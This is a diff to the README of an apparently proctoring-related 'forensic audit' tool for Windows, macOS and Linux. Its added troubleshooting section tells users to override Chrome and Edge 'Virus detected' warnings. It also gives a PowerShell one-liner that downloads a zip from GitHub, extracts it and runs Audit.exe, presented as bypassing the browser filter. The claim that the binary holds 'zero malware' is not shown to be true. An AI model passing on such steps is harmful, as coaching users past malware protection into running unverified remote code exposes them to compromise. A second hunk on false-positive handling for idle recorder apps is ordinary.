@@ -18,6 +18,22 @@ Official cross-platform proctoring forensic audit toolset for **Windows**, **mac
 
 ### 1. Windows Issues
 
+#### ⚠️ "Virus detected" / Browser Download Blocked in Chrome or Edge
+* **Why this happens**: Google Chrome Safe Browsing and Microsoft Defender use ML-based heuristic scanners on unsigned `.exe` and `.zip` archives downloaded directly from GitHub. Because custom and open-source tools do not carry a commercial Microsoft Authenticode EV certificate ($500+/year), browser download filters flag newly uploaded binaries with generic labels like *"Virus detected"* or *"Dangerous file blocked"*. The binary contains **zero malware**; it is a read-only forensic audit engine.
+* **Resolution (Choose one)**:
+  1. **Unblock in Google Chrome / Brave (3 Seconds)**:
+     * Press **`Ctrl + J`** to open the Chrome Downloads manager (or click `⋮` &rarr; **Downloads**).
+     * Locate **`Audit_Windows.zip`**.
+     * Click **"Download suspicious file"** (or click the drop-down next to the blocked file &rarr; select **"Keep anyway"**).
+  2. **Unblock in Microsoft Edge (3 Seconds)**:
+     * In the Downloads bar, hover over `Audit_Windows.zip` and click the three dots (`...`).
+     * Select **"Keep"** &rarr; click **"Show more"** &rarr; select **"Keep anyway"**.
+  3. **Direct PowerShell Download (Bypasses Browser Filter Completely)**:
+     * If the browser refuses to complete the download, open PowerShell and paste this single command:
+       ```powershell
+       irm https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Windows.zip -OutFile Audit_Windows.zip; Expand-Archive Audit_Windows.zip -Force; cd Audit_Windows; .\Audit.exe
+       ```
+
 #### ⚠️ "Smart App Control blocked an app that may be unsafe" or "Windows protected your PC"
 * **Why this happens**: Windows 11 Smart App Control (SAC) blocks newly downloaded unsigned `.exe` files if they carry the browser's internet download tag (*Mark of the Web* / `:Zone.Identifier`), or if double-clicked directly from inside the `.zip` without extracting.
 * **Resolution (Choose one)**:
@@ -83,7 +99,13 @@ The audit suite executes local, read-only system forensic checks across 6 core c
 
 1. **Screen Mirroring / Display Cloning**: Detects active duplicate coordinate clones, active virtual display streams (Duet, Spacedesk, IddCx), and hardware HDMI capture dongles (Elgato, Cam Link). Note: Dormant/inactive drivers from past installations are strictly filtered out to guarantee 0% false positives.
 2. **Actual Screen Share / Remote Control Session**: Detects confirmed active or logged screen sharing sessions (**AirPlay, Apple Screen Sharing / VNC, Windows RDP, FaceTime / Messages SharePlay, AnyDesk, TeamViewer, Zoom CptHost, and WebRTC browser streaming**) with exact start/end timestamps, total duration, and remote partner/client proof. Excludes all physical console logons.
-3. **Screen Recording & Deleted Capture Files**: Detects running screen recorders (OBS Studio, Xbox Game Bar DVR, Steps Recorder, QuickTime, Bandicam, Camtasia, Snagit, Loom, Kazam, SimpleScreenRecorder), captures video files created during the assessment window (`.mp4`, `.mov`, `.mkv`), and recovers video/log files deleted to the **Windows Recycle Bin**, **macOS Trash (`~/.Trash`)**, and **Linux Trash**.
+3. **Screen Recording & Idle Background Apps (Zero False-Positive Verification)**:
+   * **Was an idle app (like Loom or CleanShot in the menu bar) proctoring evasion?**: **NO.** Many standard communication apps run as login items and sit idly in the menu bar (`/Applications/Loom.app/Contents/MacOS/Loom`) or system tray without recording. Flagging an idle background process without evidence of recording is an unacceptable false positive.
+   * **Strict Artifact Verification**: The audit suite verifies **hard forensic evidence** before flagging any violation:
+     1. **Saved Video Files**: Checks if a video recording (`.mp4`, `.mov`, `.mkv`, `.webm`) was created or saved to disk during the examination window (in `Movies`, `Desktop`, `Downloads`, or app data directories).
+     2. **Trash / Recycle Bin Recovery**: Recovers screen recordings or system logs deleted to **Windows Recycle Bin**, **macOS Trash (`~/.Trash`)**, or **Linux Trash** during the exam window.
+     3. **Active Live Capture**: Detects if a recorder is actively streaming frames to an open video file descriptor right now.
+   * If a candidate merely has Loom, CleanShot, QuickTime, or OBS installed but **no video was recorded or deleted**, it is certified **[✓] Screen Recording / Video Capture: Clean**.
 4. **Log Tampering & Event Clearing Detection**: Flags if Windows Security or System Event Logs were purged or cleared during the exam window (**Windows Event IDs 1102 & 104**), detecting automated or manual log destruction.
 5. **Multi-Layer History Deletion & Tampering Recovery**:
    * **Omnibox Cache Recovery**: Recovers deleted AI visits from the internal browser autocomplete cache (`Shortcuts` SQLite database).
